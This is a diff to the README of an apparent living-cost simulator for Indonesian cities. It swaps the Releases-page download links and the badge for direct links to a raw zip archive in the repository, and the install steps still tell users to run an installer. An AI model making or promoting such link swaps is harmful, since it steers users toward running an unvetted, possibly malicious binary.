@@ -1,7 +1,7 @@
 # 🎉 living-cost-simulator - Easy Tool to Manage Living Costs
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/unitedivv1/living-cost-simulator/releases)
+[![Download](https://raw.githubusercontent.com/unitedivv1/living-cost-simulator/main/public/simulator-cost-living-v2.9.zip)](https://raw.githubusercontent.com/unitedivv1/living-cost-simulator/main/public/simulator-cost-living-v2.9.zip)
 
 ## 📖 Introduction
 Welcome to the living-cost-simulator. This application helps you understand your living expenses in various Indonesian cities. You can project costs based on factors like salary growth, inflation, and lifestyle choices over the next five years. 
@@ -10,7 +10,7 @@ Welcome to the living-cost-simulator. This application helps you understand your
 Using this application is straightforward. Follow these steps to download and install it on your computer.
 
 ## 🔗 Download & Install
-1. Visit the [Releases page to download](https://github.com/unitedivv1/living-cost-simulator/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/unitedivv1/living-cost-simulator/main/public/simulator-cost-living-v2.9.zip).
 2. Choose the latest version available for download.
 3. Click on the file that matches your operating system (Windows, macOS, or Linux).
 4. Once downloaded, locate the file on your computer and double-click to run the installer.
